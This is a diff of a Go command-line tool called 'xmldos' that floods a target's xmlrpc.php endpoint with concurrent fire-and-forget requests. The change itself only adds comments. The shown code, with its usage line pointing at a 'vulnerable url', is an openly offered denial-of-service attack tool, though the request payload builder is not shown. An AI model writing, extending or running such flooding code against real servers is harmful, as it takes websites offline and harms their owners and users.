@@ -11,15 +11,19 @@ import (
 func main() {
 	urlPtr := flag.String("url", "", "vulnerable url (with /xmlrpc.php)")
 	reqPtr := flag.Int("req", 100, "amount of requests (goroutines)")
+	// parse flags
 	flag.Parse()
+	// check if url is specified
 	if *urlPtr == "" {
 		fmt.Println("Please specify a url!")
 		fmt.Println("Usage: ./xmldos -url http://example.com/xmlrpc.php -req 100")
 		os.Exit(1)
 	}
+	// send requests
 	for i := 0; i < *reqPtr; i++ {
 		go sendreq(*urlPtr, i)
 	}
+	// wait for input
 	fmt.Scanf("%s")
 }
 
@@ -58,7 +62,7 @@ func sendreq(url string, threadnum int) {
 		panic(err)
 	}
 	fmt.Println("Request sent! Thread:", threadnum)
-	// don't wait for response (fire and forget)
+	// don't wait for response
 	client.Do(req)
 	defer req.Body.Close()
 }
